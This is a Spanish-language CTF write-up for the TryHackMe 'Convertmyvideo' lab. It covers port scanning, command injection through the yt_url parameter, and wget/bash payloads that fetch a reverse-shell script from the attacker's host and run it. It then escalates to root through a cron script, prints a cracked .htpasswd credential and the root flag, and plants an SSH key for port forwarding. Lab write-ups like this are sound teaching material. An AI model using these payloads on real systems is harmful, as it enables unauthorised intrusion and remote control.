---
layout: post
title:  "Convertmyvideo - TryHackMe"
date:   2021-05-27 2:18:00 +0200
last_modified_at: 2021-05-14 07:21:29 +0200
toc:  true
tags: [ctf, linux, Tryhackme, Writeup, cron, ssh, command_injection, bonus]
---


{: .message}

Es una maquina linux que nos permite explotar una vulnerabilidad que se encuentra en el OWASP Top 10 (2017).

## Enumeración
### Nmap
*Puertos:*
* 22/tcp --> OpenSSH 7.6p1
* 80/tcp --> Apache httpd 2.4.29


```bash
nmap -p- --min-rate 5000 10.10.145.178 -oG Allport             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 20:01 EDT
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 22.33% done; ETC: 20:06 (0:03:46 remaining)
Stats: 0:01:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 23.09% done; ETC: 20:06 (0:03:43 remaining)
Stats: 0:01:39 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 32.92% done; ETC: 20:06 (0:03:24 remaining)
Warning: 10.10.145.178 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.145.178
Host is up (0.036s latency).
Not shown: 41212 filtered ports, 24321 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 266.37 seconds
```
*Escaneo mas exhaustivo:*
```sql 
nmap -sC -sV -Pn -p22,80 10.10.145.178 -oN Scan_Port     
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 20:09 EDT
Nmap scan report for 10.10.145.178
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds
```


### Fuzzer

Luego de fuzzear di con un directorio que es admin:

![](/images_blog/img_convertmyvideo/Pastedimage20210416201737.png)

## PoC Inyección de comandos

Despues de un rato probando di con una inyección de comando en la parte donde se inserta la url

```bash
POST / HTTP/1.1
Host: 10.10.43.37
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42
Origin: http://10.10.43.37
Connection: close
Referer: http://10.10.43.37/


yt_url=|whoami;
```

![](/images_blog/img_convertmyvideo/Pastedimage20210416210230.png)

Podemos tambien visualizar la flag desde aqui (Para el espaciado utilizo Input Field Separators que es una variable de separador de campo de entradas):  

![](/images_blog/img_convertmyvideo/Pastedimage20210416211813.png)

Podemos visualizar el contenido que tiene admin:
![](/images_blog/img_convertmyvideo/Pastedimage20210416211957.png)

Algo que llama la atencion es el contenido que tiene .htpasswd

![](/images_blog/img_convertmyvideo/Pastedimage20210416212308.png)

```
"output":"itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y\/\n"
```

Con esto lo podremos crackear ```jesie```  y posteriormente entrar en el panel que nos aparece cuando entramos a /admin. En esta oportunidad iremos por otro vector.

## Shell Inicial

Primero haremos una reverse sencilla con bash y luego nos montamos un servidor con python:

```bash
POST / HTTP/1.1

Host: 10.10.43.37
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42
Origin: http://10.10.43.37
Connection: close
Referer: http://10.10.43.37/

yt_url=|wget${IFS}10.9.206.201:8000/rev.sh;
```

Luego ejecutamos la reverse:

```
POST / HTTP/1.1
Host: 10.10.145.178
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 25
Origin: http://10.10.145.178
Connection: close
Referer: http://10.10.145.178/

yt_url=|bash${IFS}rev.sh;
```


![](/images_blog/img_convertmyvideo/Pastedimage20210416213538.png)


```sql
rlwrap nc -lvnp 443                                  
listening on [any] 443 ...
connect to [10.9.206.201] from (UNKNOWN) [10.10.145.178] 42824
bash: cannot set terminal process group (879): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dmv:/var/www/html$ 
```

## PrivEsc

La  primera utilidad a utilizar es ```linpeas```  esta nos muestra lo mismo que sacamos con la inyección de comandos:

```
Reading /var/www/html/admin/.htpasswd                                        
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```


Un script interesante es clean.sh, la idea es basicamente agregar una reverse y esperar que sea ejecutada:

![](/images_blog/img_convertmyvideo/Pastedimage20210521174646.png)

En esta imagen se confirma mi teoria que basicamente consiste en que ese script es ejecutado por root mediante una tarea cron:

![](/images_blog/img_convertmyvideo/Pastedimage20210521174719.png)

```bash
cat root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
root@dmv:~# 
```

MACHINE PWNED!!!!!

## Extra 

Esto no va con la resolución de la maquina pero me parece interesante el tema del local port forwarding que nos permite a nosotros visualizar servicios que solo puedan verse en la maquina de manera local (Este no es el caso pero suponiendo que nos encontremos mas adelante con esto).

Primero nos generamos un par de llaves con ssh-keygen:
![](/images_blog/img_convertmyvideo/Pastedimage20210521180334.png)

Agregamos nuestra llave al authorized_keys:
![](/images_blog/img_convertmyvideo/Pastedimage20210521180445.png)

Probamos que todo este correcto:
![](/images_blog/img_convertmyvideo/Pastedimage20210521180621.png)

Con el siguiente comando le estamos diciendo que queremos que el puerto 80 de la maquina victima sea reflejado en el 8084 de nuestra maquina:
![](/images_blog/img_convertmyvideo/Pastedimage20210521181139.png)

Asi lo podriamos visualizar:
![](/images_blog/img_convertmyvideo/Pastedimage20210521181155.png)

En esta maquina pudimos explotar una inyección de comando y posteriormente abusar de una tarea cron.

